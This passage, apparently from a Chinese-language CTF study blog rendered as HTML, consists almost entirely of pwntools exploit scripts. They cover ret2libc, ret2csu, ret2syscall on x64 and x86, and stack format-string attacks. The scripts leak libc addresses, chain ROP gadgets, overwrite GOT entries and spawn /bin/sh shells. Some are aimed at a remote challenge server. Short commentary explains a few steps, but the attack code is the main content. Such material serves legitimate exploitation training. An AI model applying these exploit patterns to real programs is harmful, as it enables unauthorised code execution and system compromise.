class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># io = process(pwnfile)</span></span><br><span class="line">io = remote(<span class="string">&quot;47.97.58.52&quot;</span>, <span class="number">42003</span>)</span><br><span class="line"></span><br><span class="line">script = <span class="string">&quot;&quot;&quot;set context-output /dev/pts/5&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># gdb.attach(io, script)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvline()</span><br><span class="line">puts_got  = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">vuln_addr = elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">padding = cyclic(<span class="number">0x28</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x4012c3</span></span><br><span class="line">rdi = puts_got</span><br><span class="line">call_puts = <span class="number">0x401218</span> <span class="comment"># call puts</span></span><br><span class="line">puts_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = flat([padding, pop_rdi_ret, rdi, puts_addr, vuln_addr])</span><br><span class="line">io.send(payload)</span><br><span class="line">puts_libc = u64(io.recv()[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_libc - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_libc = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;puts@libc&gt;:&quot;</span>, <span class="built_in">hex</span>(puts_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;libc_base&gt;:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;system_libc&gt;:&quot;</span>, <span class="built_in">hex</span>(system_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;/bin/sh&gt;:&quot;</span>, <span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">rdi = bin_sh_addr</span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">payload = flat([padding, ret, pop_rdi_ret, rdi, system_libc])</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>ret2csu</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;47.97.58.52&quot;</span>, <span class="number">40005</span>)</span><br><span class="line"><span class="comment"># io = process(pwnfile)</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(<span class="number">0x40126D</span>)</span><br><span class="line">bin_sh_addr = <span class="number">0x404090</span></span><br><span class="line">io.send(bin_sh)</span><br><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line">padding = cyclic(<span class="number">15</span>) + <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">8</span>)</span><br><span class="line">csu1 = <span class="number">0x4013A0</span></span><br><span class="line">csu2 = <span class="number">0x4013BA</span></span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span></span><br><span class="line">r12 = bin_sh_addr</span><br><span class="line">r13 = <span class="number">0</span></span><br><span class="line">r14 = <span class="number">0</span></span><br><span class="line">r15 = <span class="number">0x404098</span></span><br><span class="line">payload = flat([padding, csu2, rbx, rbp, r12, r13, r14, r15, csu1])</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>在amd64情况下，通过<code>gadegt</code>无法很好的控制rdi，所以用<strong>ret2csu</strong>来传参调用write泄露地址</p><p>exp分两部分，第一部分泄露地址，第二部分调用system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">libc = ELF(libc)</span><br><span class="line">write_offset = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_offset = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;./question_5_x64&quot;</span></span><br><span class="line">proc = process(target)</span><br><span class="line">target = ELF(target)</span><br><span class="line"></span><br><span class="line">write_got = target.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">padding = cyclic(<span class="number">0x10</span>)</span><br><span class="line">ret2csu = target.symbols[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x52</span> <span class="comment"># constructor support unit</span></span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span></span><br><span class="line">r12 = <span class="number">1</span></span><br><span class="line">r13 = write_got</span><br><span class="line">r14 = <span class="number">8</span></span><br><span class="line">r15 = write_got</span><br><span class="line">retn = <span class="number">0x4011D8</span></span><br><span class="line">ret2dofunc = target.symbols[<span class="string">&#x27;dofunc&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(proc)</span></span><br><span class="line"></span><br><span class="line">payload = flat([padding, ret2csu, rbx, rbp, r12, r13, r14, r15, retn])</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>) * <span class="number">7</span> + p64(ret2dofunc)</span><br><span class="line">delim = <span class="string">&quot;input:&quot;</span></span><br><span class="line">proc.sendlineafter(delim, payload)</span><br><span class="line">proc.recvuntil(<span class="string">b&quot;byebye&quot;</span>)</span><br><span class="line">write_libc = u64(proc.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = write_libc - write_offset</span><br><span class="line">system_libc = libc_base + system_offset</span><br><span class="line">bin_sh = libc_base + bin_sh_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;write@libc&gt;:&quot;</span>, <span class="built_in">hex</span>(write_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;libc_base&gt;:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;system@libc&gt;:&quot;</span>, <span class="built_in">hex</span>(system_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;/bin/sh&gt;:&quot;</span>, <span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret1 = <span class="number">0x4011fb</span></span><br><span class="line">rdi = bin_sh</span><br><span class="line">ret2 = <span class="number">0x401016</span> <span class="comment"># 因为glibc &gt;= 2.27 所以需要多pop一下rsp</span></span><br><span class="line">ret = system_libc</span><br><span class="line">payload = flat([padding, ret1, rdi, ret2, ret])</span><br><span class="line"></span><br><span class="line">proc.sendlineafter(delim, payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">proc.interactive()</span><br></pre></td></tr></table></figure><p><strong>ret2syscall</strong></p><p>系统调用号在<code>/usr/include/asm/unistd_[32/64].h</code>中，或者<code>/usr/include/x86_64-linux-gnu/asm/unistd_[32/64].h</code></p><p><strong>syscall</strong> 也会记录下一条指令的地址然后直接返回到下一条指令（保存 <code>rip</code></p><p>x64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;./question_5_x64_static&quot;</span></span><br><span class="line">io = process(target)</span><br><span class="line">target = ELF(target)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NR_read = <span class="number">0</span></span><br><span class="line">NR_execve = <span class="number">0x3b</span></span><br><span class="line">bin_sh = <span class="number">0x4AF648</span></span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x40E56C</span></span><br><span class="line"></span><br><span class="line">padding = cyclic(<span class="number">0x10</span>)</span><br><span class="line">pop_rax_ret = <span class="number">0x43efc3</span></span><br><span class="line">rax = NR_read</span><br><span class="line">pop_rdi_ret = <span class="number">0x401741</span></span><br><span class="line">rdi = <span class="number">0</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x407b1e</span></span><br><span class="line">rsi = bin_sh</span><br><span class="line">pop_rdx_ret = <span class="number">0x40168b</span></span><br><span class="line">rdx = <span class="number">8</span></span><br><span class="line">payload1 = flat([padding, pop_rax_ret, rax, pop_rdi_ret, rdi, pop_rsi_ret, rsi, pop_rdx_ret, rdx, syscall])</span><br><span class="line"></span><br><span class="line">rax = NR_execve</span><br><span class="line">rdi = bin_sh</span><br><span class="line">rsi = <span class="number">0</span></span><br><span class="line">rdx = <span class="number">0</span></span><br><span class="line">payload2 = flat([pop_rax_ret, rax, pop_rdi_ret, rdi, pop_rsi_ret, rsi, pop_rdx_ret, rdx, syscall])</span><br><span class="line"></span><br><span class="line">payload = payload1 + payload2</span><br><span class="line"></span><br><span class="line">delim = <span class="string">&quot;input:&quot;</span></span><br><span class="line">io.sendlineafter(delim, payload)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>x86</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;./question_5_static_x86&quot;</span></span><br><span class="line">io = process(target)</span><br><span class="line">target = ELF(target)</span><br><span class="line"></span><br><span class="line">NR_read = <span class="number">3</span></span><br><span class="line">NR_execve = <span class="number">11</span></span><br><span class="line">bin_sh = <span class="number">0x80E6044</span></span><br><span class="line">int_80h_ret = <span class="number">0x8071FE0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">padding = cyclic(<span class="number">0x14</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080ae706</span></span><br><span class="line">eax = NR_read</span><br><span class="line">pop_ebx_ret = <span class="number">0x0804901e</span></span><br><span class="line">ebx = <span class="number">0</span></span><br><span class="line">ecx = bin_sh</span><br><span class="line">mov_ecx_eax_ret = <span class="number">0x080929b0</span></span><br><span class="line">pop_edx_ret = <span class="number">0x08069ca8</span></span><br><span class="line">edx = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload1 = flat([padding, pop_eax_ret, ecx, mov_ecx_eax_ret, pop_eax_ret, eax, pop_ebx_ret, ebx, pop_edx_ret, edx, int_80h_ret])</span><br><span class="line"></span><br><span class="line">eax = NR_execve</span><br><span class="line">ebx = bin_sh</span><br><span class="line">ecx = <span class="number">0</span></span><br><span class="line">edx = <span class="number">0</span></span><br><span class="line">payload2 = flat([pop_eax_ret, ecx, mov_ecx_eax_ret, pop_eax_ret, eax, pop_ebx_ret, ebx, pop_edx_ret, edx, int_80h_ret])</span><br><span class="line"></span><br><span class="line">payload = payload1 + payload2</span><br><span class="line"></span><br><span class="line">delim = <span class="string">&quot;input:&quot;</span></span><br><span class="line">io.sendlineafter(delim, payload)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>栈上fmtstr</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">DEBUG = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./fmt_str_level_1_x86&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">delim = <span class="string">b&quot;input:\n&quot;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;%75$p\x00&quot;</span> <span class="comment"># to get &lt;main+30&gt; address</span></span><br><span class="line">io.send(payload1)</span><br><span class="line">main_30 = <span class="built_in">int</span>(io.recvuntil(delim, <span class="literal">True</span>)[<span class="number">2</span>:], <span class="number">16</span>) <span class="comment"># &lt;main+30&gt;</span></span><br><span class="line">main_addr = main_30 - <span class="number">30</span> <span class="comment"># &lt;main&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;main&gt;:&quot;</span>, <span class="built_in">hex</span>(main_addr))</span><br><span class="line">offset = elf.got[<span class="string">&#x27;puts&#x27;</span>] - elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = main_addr + offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;puts@got&gt;:&quot;</span>, <span class="built_in">hex</span>(puts_got))</span><br><span class="line"></span><br><span class="line">payload2 = flat([puts_got, <span class="string">&quot;%7$s\x00&quot;</span>]) <span class="comment"># to get &lt;puts@libc&gt; address from &lt;puts@got&gt;</span></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.recv(<span class="number">4</span>)</span><br><span class="line">puts_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;puts@libc&gt;:&quot;</span>, <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_base = puts_addr - offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;libc_base&gt;:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;system@libc&gt;:&quot;</span>, <span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;/bin/sh&gt;:&quot;</span>, <span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">offset = elf.got[<span class="string">&#x27;printf&#x27;</span>] - elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">printf_got = main_addr + offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;printf@got&gt;:&quot;</span>, <span class="built_in">hex</span>(printf_got))</span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;printf_got: system_addr&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload:&quot;</span>, payload)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    pause()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./fmt_str_level_1_x64&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">delim = <span class="string">b&quot;input:\n&quot;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;%41$p\x00&quot;</span> <span class="comment"># to get &lt;main+28&gt; address</span></span><br><span class="line">io.send(payload1)</span><br><span class="line">main_28 = <span class="built_in">int</span>(io.recvuntil(delim, <span class="literal">True</span>)[<span class="number">2</span>:], <span class="number">16</span>) <span class="comment"># &lt;main+28&gt;</span></span><br><span class="line">main_addr = main_28 - <span class="number">28</span> <span class="comment"># &lt;main&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;main&gt;:&quot;</span>, <span class="built_in">hex</span>(main_addr))</span><br><span class="line">offset = elf.got[<span class="string">&#x27;puts&#x27;</span>] - elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = main_addr + offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;puts@got&gt;:&quot;</span>, <span class="built_in">hex</span>(puts_got))</span><br><span class="line"></span><br><span class="line">payload2 = flat([<span class="string">&quot;%7$s&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, puts_got, <span class="string">&quot;\x00&quot;</span>]) <span class="comment"># to get &lt;puts@libc&gt; address from &lt;puts@got&gt;</span></span><br><span class="line">io.send(payload2)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;puts@libc&gt;:&quot;</span>, <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_base = puts_addr - offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;libc_base&gt;:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;system@libc&gt;:&quot;</span>, <span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;/bin/sh&gt;:&quot;</span>, <span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">offset = elf.got[<span class="string">&#x27;printf&#x27;</span>] - elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">printf_got = main_addr + offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;printf@got&gt;:&quot;</span>, <span class="built_in">hex</span>(printf_got))</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;printf_got: system_addr&#125;) <span class="comment"># offset 是输入地址对printf()来说是$几参数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload:&quot;</span>, payload)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    pause()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;27.25.151.29&quot;,34277)</span></span><br><span class="line">elf = ELF(<span 